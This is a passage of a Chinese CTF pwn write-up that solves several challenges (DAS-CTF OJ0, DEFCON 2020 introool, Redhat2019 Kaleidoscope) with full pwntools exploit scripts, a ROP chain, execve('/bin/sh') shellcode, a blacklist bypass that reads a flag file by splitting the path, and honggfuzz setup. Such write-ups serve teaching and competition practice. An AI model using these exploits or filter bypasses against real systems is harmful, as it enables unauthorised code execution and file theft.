            ROP_chain += p64(libc.address + 0x00000000000439c8)
            ROP_chain += p64(2)
            ROP_chain += p64(libc.address + 0x00000000000d2975)
            # read(3,BSS+0x500,0x20)
            ROP_chain += p64(libc.address + 0x000000000002155f)
            ROP_chain += p64(3)
            ROP_chain += p64(libc.address + 0x0000000000023e6a)
            ROP_chain += p64(PIE_address + bf.bss() + 0x500)
            ROP_chain += p64(libc.address + 0x0000000000001b96)
            ROP_chain += p64(0x20)
            ROP_chain += p64(libc.address + 0x00000000000439c8)
            ROP_chain += p64(0)
            ROP_chain += p64(libc.address + 0x00000000000d2975)
            # write(0,BSS+0x500,0x20)
            ROP_chain += p64(libc.address + 0x000000000002155f)
            ROP_chain += p64(1)
            ROP_chain += p64(libc.address + 0x0000000000023e6a)
            ROP_chain += p64(PIE_address + bf.bss() + 0x500)
            ROP_chain += p64(libc.address + 0x0000000000001b96)
            ROP_chain += p64(0x20)
            ROP_chain += p64(libc.address + 0x00000000000439c8)
            ROP_chain += p64(1)
            ROP_chain += p64(libc.address + 0x00000000000d2975)
            # exit(0)
            ROP_chain += p64(libc.address + 0x000000000002155f)
            ROP_chain += p64(0)
            ROP_chain += p64(libc.address + 0x00000000000439c8)
            ROP_chain += p64(60)
            ROP_chain += p64(libc.address + 0x00000000000d2975)
            for i in ['[',']']:
                if i in ROP_chain:
                    raise ValueError('ROP_chain ERROR')

            sh.recvuntil('want to continue?' , timeout = 0.3)
            sh.send('y')

            sh.recvuntil('enter your code:' , timeout = 0.3)
            sh.sendline(p64(0) + ROP_chain)

            sh.recvuntil('want to continue?' , timeout = 0.3)
            sh.send('y')

            sh.recvuntil('enter your code:' , timeout = 0.3)
            sh.sendline('+[&gt;.+],')
            sh.send(p8((code_low_addr) &amp; 0xFF))
            sh.send(p8((code_low_addr) &amp; 0xFF))

            # get_gdb(sh)
            sh.recvuntil('want to continue?' , timeout = 0.3)
            sh.send('n')

            sh.send('/flag')
            # sh.interactive()
            flag = sh.recvrepeat(0.3)
            sh.close()
            return flag
        except Exception as e:
            traceback.print_exc()
            sh.close()
            continue

if __name__ == "__main__":
    flag = Attack()
    log.success('The flag is ' + re.search(r'flag`{`.+`}`',flag).group())
```



## 0x05 以 2020 DAS-CTF OJ0 为例

> 安恒月赛的题目为闭源信息，本例题不会给出任何形式的附件下载地址

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-14-015306.png)

可以发现，这是一个C语言的解释器，可以执行我们输入的任意代码，然后依据题目要求输出指定信息后，会执行`tree /home/ctf`命令，从而告知我们`flag`文件的具体位置。

接下来我们需要构造代码进行`flag`的读取。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

根据题目信息回显，可以发现，题目应该是存在有黑名单机制，那么我们不考虑启动`shell`，转而考虑使用`ORW`的方式获取`flag`，那么最简单的程序：

```
#include&lt;stdio.h&gt;
int main()`{`
    char buf[50]; 
    char path[50] = "/home/ctf/flagx00"; 
    int fd = open(path);
    read(fd,buf,50);
    write(1,buf,50);
`}`@
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-14-020007.png)

可以发现被过滤了，那么考虑黑名单应该会检测整段代码，以防止出现`home`、`ctf`、`flag`等敏感字符，那么我们可以利用`string`函数进行字符串的拼接来绕过保护。

### <a class="reference-link" name="FInal%20Exploit"></a>FInal Exploit

```
#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
int main()`{`
    char buf[50]; 
    char path_part_1[5] = "/hom"; 
    char path_part_2[5] = "e/ct"; 
    char path_part_3[5] = "f/fl"; 
    char path_part_4[5] = "agx00"; 
    char path[20];
    sprintf(path, "%s%s%s%s", path_part_1, path_part_2, path_part_3, path_part_4);
    int fd = open(path);
    read(fd,buf,50);
    write(1,buf,50);
`}`@
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-14-020751.png)



## 0x06 以 DEFCON CTF Qualifier 2020 introool 为例

> 题目地址：[https://github.com/o-o-overflow/dc2020q-introool-public](https://github.com/o-o-overflow/dc2020q-introool-public)

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

无二进制文件，拉取项目直接启动`docker`即可
1. 题目要求首先给出一个用于填充的字符，要求这个字符必须大于等于`0x80`。
1. 接下来要求给出填充的长度，这个长度要求介于`0x80`~`0x800`之间。
1. 接下来询问要`patch`哪个地址处的字节，用于`patch`的字符是什么。
1. 接下来再次询问要`patch`哪个地址处的字节，用于`patch`的字符是什么。
1. 最后要求给出三个`ROP gadgets`。
1. 在我们给定了以上参数之后，程序会生成一个`ELF`文件，我们可以运行它，也可以查看其内容。
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-14-140656.png)

生成的`ELF`文件仅开启了`NX`保护

经过反编译我们可以看到，我们的`patch`是从`0x4000EC`，也就是`main + 4`处开始，最短填充至`0x40016C`，`main`函数对应的汇编码就为：

```
push rbp
mov  rbp,rsp
[patch data]
mov  eax,0
pop  rbp
ret
```

然后我们写入的三个`ROP_gadgets`将会被写入到`bss`段。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-14-141531.png)

栈上将填满环境变量，这将导致我们正常情况下的`main`函数返回值将会是一个非法值。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

那么对于这道题目，我们利用的是`ELF`文件的一个特性：

**当数据段未页对齐时，其中的内容将也被映射到`text`段的末尾。**

也就是说，对于这个题目来说，位于`bss`段的`ROP_gadgets`将会被映射到`text`段中，

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-14-143417.png)

那么，如果我们将`ROP_gadgets`替换为`shellcode`，再利用`patch`加入跳转指令，跳转至`shellcode`即可。

可以使用`ret rel8`形式的跳转，这种跳转的通常为`EB XX`，例如本题应该使用`EB 46`代表的汇编语句是`jmp 0x48`，但是，这里的`0x48`是相对地址，相对于**本条地址**的偏移，例如我们将`0x40068`处的代码改为`jmp 0x48`，反汇编后，这里的代码将显示为`jmp 0x4001B0`。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-14-150448.png)

那么，我们接下来直接去`exploit-db`寻找好用的`shellcode`即可：

```
0000000000400080 &lt;_start&gt;:
  400080:    50                       push   %rax
  400081:    48 31 d2                 xor    %rdx,%rdx
  400084:    48 31 f6                 xor    %rsi,%rsi
  400087:    48 bb 2f 62 69 6e 2f     movabs $0x68732f2f6e69622f,%rbx
  40008e:    2f 73 68 
  400091:    53                       push   %rbx
  400092:    54                       push   %rsp
  400093:    5f                       pop    %rdi
  400094:    b0 3b                    mov    $0x3b,%al
  400096:    0f 05                    syscall
```

### <a class="reference-link" name="FInal%20Exploit"></a>FInal Exploit

```
from pwn import *
import traceback
import sys
import base64
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

# file_name=ELF('./file_name', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./file_name")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./file_name")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string,drop=True),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        sh.recvuntil('&gt; ')
        sh.sendline('90') # NOP byte
        sh.recvuntil('&gt; ')
        sh.sendline('80') # NOP size
        sh.recvuntil(': ')
        sh.sendline('7C') # patch offset
        sh.recvuntil(': ')
        sh.sendline('EB') # patch value
        sh.recvuntil(': ')
        sh.sendline('7D') # patch offset
        sh.recvuntil(': ')
        sh.sendline('46') # patch value
        sh.recvuntil('[1/3] &gt; ')
        sh.sendline('504831d24831f648') # ROP
        sh.recvuntil('[2/3] &gt; ')
        sh.sendline('bb2f62696e2f2f73') # ROP
        sh.recvuntil('[3/3] &gt; ')
        sh.sendline('6853545fb03b0f05') # ROP 
        sh.recvuntil('&gt; ')
        # sh.sendline('1') # Watch
        # open('./introool','w').write(base64.b64decode(sh.recvuntil('n',drop=True)))
        sh.sendline('2') # Attack
        sh.interactive()
        flag=get_flag(sh)
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag`{`.+`}`',flag).group())
```

## 0x07 以 [Redhat2019] Kaleidoscope 为例

> 题目地址：[https://pan.baidu.com/s/18-GLNWmJejh-UZrK1hOQTA](https://pan.baidu.com/s/18-GLNWmJejh-UZrK1hOQTA)

### <a class="reference-link" name="%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"></a>题目信息

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-16-141707.png)

没有开启`Canary`和`RELRO`保护的`64`位程序

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-16-141620.png)

通过试运行的结果，可以确定这是一个解释器

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-16-142141.png)

当我们把它加载到`IDA`中时，我们就可以很明显的看出，此程序使用了`C++`语言编写，并且在编译时启用了一些`LLVM`的优化选项，使得我们的代码识读变得十分困难，我们可以通过题目名以及一些题目中的固定字符串去发现，这是一个`Kaleidoscope`即时解释器，`LLVM`项目将其作为例程来表示如何去构建一个即时解释器，我们可以在 [Building a JIT: Starting out with KaleidoscopeJIT](https://llvm.org/docs/tutorial/BuildingAJIT1.html) 找到这个例程的解释，同时可以在 [llvm-kaleidoscope](https://github.com/ghaiklor/llvm-kaleidoscope) 处找到该项目的源码。

该项目的`main`函数源码是形如这样子的：

```
int main() `{`
    BinopPrecedence['&lt;'] = 10;
    BinopPrecedence['+'] = 20;
    BinopPrecedence['-'] = 20;
    BinopPrecedence['*'] = 40;
    fprintf(stderr, "ready&gt; ");
    getNextToken();
    TheModule = llvm::make_unique&lt;Module&gt;("My awesome JIT",     TheContext);
    MainLoop();
    TheModule-&gt;print(errs(), nullptr);
    return 0;
`}`
```

但是本题的`main`函数的反编译结果却是：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-16-143504.png)

这种代码会令人十分的难以去理解，但是通过比较这两段代码可以发现，这段代码额外的定义了一个`=`操作符，一般情况下，这种额外的定义往往会伴随着漏洞的发生，但是由于此处的代码分析量实在是过于庞杂，因此我们此处考虑使用`fuzz`的思路。

### `fuzz`测试

此处我们决定使用`honggfuzz`这个模糊测试工具，这是一个由`Google`维护的一个`fuzz`工具。

#### 安装`honggfuzz`(以`ubuntu 16.04`为例)

首先我们需要拉取项目

```
git clone https://github.com/google/honggfuzz.git
cd honggfuzz
```

然后需要安装相关的依赖库文件

```
apt-get install libbfd-dev libunwind8-dev clang-5.0 lzma-dev
```

接下来需要确认`lzma`的存在：

```
locate lzma
```

如果发现只有`liblzma.so.x`文件，那么需要建立一个符号链接

```
sudo ln -s /lib/x86_64-linux-gnu/liblzma.so.5 /lib/x86_64-linux-gnu/liblzma.so
```

接下来执行以下命令来完成编译安装：

```
sudo make
cp libhfcommon includes/libhfcommon
cp libhfnetdriver includes/libhfnetdriver
cp libhfuzz includes/libhfuzz
sudo make install
```

至此，我们的`honggfuzz`主程序安装结束。

#### 安装`honggfuzz-qemu`(以`ubuntu 16.04`为例)

接下来因为我们要进行`fuzz`的是黑盒状态下的程序，因此我们需要使用`qemu`模式来辅助我们监控`fuzz`的代码覆盖率，那么`honggfuzz`为我们提供了`honggfuzz`的`MAKEFILE`，我们直接使用如下命令即可安装

```
cd qemu_mode
make
sudo apt-get install libpixman-1-dev
cd honggfuzz-qemu &amp;&amp; make
```

⚠️：使用`docker`化的`honggfuzz`时会产生变量类型的报错，目前没有找到解决方式，已经提了`issue`，因此不建议使用`docker`化的`honggfuzz`安装`honggfuzz-qemu`。

⚠️：安装时会使用`git`安装不同的几个包。

#### <a class="reference-link" name="%E5%90%AF%E5%8A%A8%E6%B5%8B%E8%AF%95"></a>启动测试

安装完毕后我们就可以启动`fuzz`测试了

```
honggfuzz -f /work/in/ -s -- ./qemu_mode/honggfuzz-qemu/x86_64-linux-user/qemu-x86_64 /work/Kaleidoscope
```

其中，`/work/in/`是语料库文件夹，将我们所需要的种子语料以`txt`形式放置在语料库文件夹即可。

可以发现，在`1 h 25 min`分钟的时间里，就已经触发了一些`crash`：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-20-054200.png)

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

我们可以查看当前文件夹下生成的`crash`文件，里面存储了产生此`crash`所使用的输入样本，我们注意到，在这`14`个样本中，有一个形如:

```
def fib(x)
    if x &lt; 3 then
        1
    else
        526142246948557=666
fib(40)
```

的样本，当我们把它喂进程序时，程序显示了一个较为异常的报错信息。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-20-115729.png)

这里说程序无法处理我们给定的外部函数，可以发现这个报错里出现了`extern`关键字

那么我们进一步测试，发现当我们向程序输入`extern`关键字时会报错：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-20-120257.png)

那么我们来定位这些报错的位置：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-20-134911.png)

可以发现，当我们直接使用`extern`函数时会产生报错，而当我们采用形如：

```
def fib(x)
    if x &lt; 3 then
        1
    else
        1=1
fib(40)
```

的输入时会直接调用`libLLVM.so`中的内容。

我们可以分析出以下调用过程，当我们向程序传递以上参数时，首先会经过解释器的函数解析，解析后会将我们要调用的函数名传递给`libLLVM.so`，然后通过其内部的`RTDyldMemoryManager::getPointerToNamedFunction`做函数指针的寻址，关于此函数[此处](https://github.com/llvm-mirror/llvm/blob/8b8f8d0ad8a1f837071ccb39fb96e44898350070/lib/ExecutionEngine/RuntimeDyld/RTDyldMemoryManager.cpp#L290)有更加详细的解析。

那么此处我们是否可以通过这个机制来调用任意函数呢？我们构造以下数据来进行输入：

```
payload = '''
        def puts(x)
            if x &lt; 3 then
                1
            else
                1=1
        puts(1234)
        '''
get_gdb(sh,stop=True)
sh.recvuntil('ready&gt; ')
sh.sendline(payload)
sleep(0.5)
sh.recvuntil('ready&gt; ')
sh.sendline('1')
sh.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-20-140450.png)

可以发现，的确调用了`libc`内的函数，且发现其参数正是我们传入的`1234`。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

那么我们只需要先调用`mmap(1048576, 4096, 7, 34, 0)`来分配一段空间以用来存储我们的`/bin/sh`

然后调用`read(0,1048576,10)`来读取我们的`/bin/sh`，最后再调用`system(1048576)`即可`getshell`

### <a class="reference-link" name="Final%20Exploit"></a>Final Exploit

```
from pwn import *
import traceback
import sys
context.log_level='debug'
context.arch='amd64'
# context.arch='i386'

Kaleidoscope=ELF('./Kaleidoscope', checksec = False)

if context.arch == 'amd64':
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec = False)
elif context.arch == 'i386':
    try:
        libc=ELF("/lib/i386-linux-gnu/libc.so.6", checksec = False)
    except:
        libc=ELF("/lib32/libc.so.6", checksec = False)

def get_sh(Use_other_libc = False , Use_ssh = False):
    global libc
    if args['REMOTE'] :
        if Use_other_libc :
            libc = ELF("./", checksec = False)
        if Use_ssh :
            s = ssh(sys.argv[3],sys.argv[1], sys.argv[2],sys.argv[4])
            return s.process("./Kaleidoscope")
        else:
            return remote(sys.argv[1], sys.argv[2])
    else:
        return process("./Kaleidoscope")

def get_address(sh,info=None,start_string=None,address_len=None,end_string=None,offset=None,int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if int_mode :
        return_address = int(sh.recvuntil(end_string,drop=True),16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8,'x00'))
    elif context.arch == 'amd64':
        return_address=u64(sh.recvuntil(end_string,drop=True).ljust(8,'x00'))
    else:
        return_address=u32(sh.recvuntil(end_string,drop=True).ljust(4,'x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address

def get_flag(sh):
    sh.sendline('cat /flag')
    return sh.recvrepeat(0.3)

def get_gdb(sh,gdbscript=None,stop=False):
    gdb.attach(sh,gdbscript=gdbscript)
    if stop :
        raw_input()

def Multi_Attack():
    # testnokill.__main__()
    return

def Attack(sh=None,ip=None,port=None):
    if ip != None and port !=None:
        try:
            sh = remote(ip,port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        # Your Code here
        payload = """
        def mmap(x y z o p)
            if x &lt; 3 then
                1
            else
                a=1

        mmap(1048576, 4096, 7, 34, 0);
        """
        sh.recvuntil('ready&gt; ')
        # get_gdb(sh)
        sh.sendline(payload)
        sleep(0.5)

        payload = """
        def read(x y z)
            if m &lt; 3 then
                1
            else
                0=1

        def system(x)
            if m &lt; 3 then
                1
            else
                0=1

        read(0, 1048576, 10);
        system(1048576);
        """
        sh.recvuntil('ready&gt; ')
        sh.sendline(payload)
        sh.recvuntil('ready&gt; ')
        sh.sendline('/bin/shx00')
        sh.interactive()
        flag=get_flag(sh)
        # try:
        #     Multi_Attack()
        # except:
        #     throw('Multi_Attack_Err')
        sh.close()
        return flag
    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'

if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(sh=sh)
    log.success('The flag is ' + re.search(r'flag`{`.+`}`',flag).group())
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-20-144113.png)



## 0x08 以 2020 DAS-CTF OJ1 为例

> 安恒月赛的题目为闭源信息，本例题不会给出任何形式的附件下载地址

### <a class="reference-link" name="%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"></a>解题思路

题目要求我们输入不带括号的C代码来执行，注意，此处的程序要求我们不允许带有任何形式的括号，包括大括号，中括号，小括号，这就使得我们无法通过常规的`C`代码形式提交，例如`int main()`{``}``等等，这里我们给出一种奇特的可运行的`C`代码形式。

```
const char main=0x55,a1=0x48,a2=0x89,a3=0xe5;
```

例如我们直接编译以上代码，在`main`处下断

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://img.lhyerror404.cn/error404/2020-06-20-151501.png)

那么我们直接找到对应汇编码即可。



## 0x09 参考链接

[【原】[Redhat2019] Kaleidoscope – matshao](http://matshao.com/2019/11/11/Redhat2019-Kaleidoscope/)
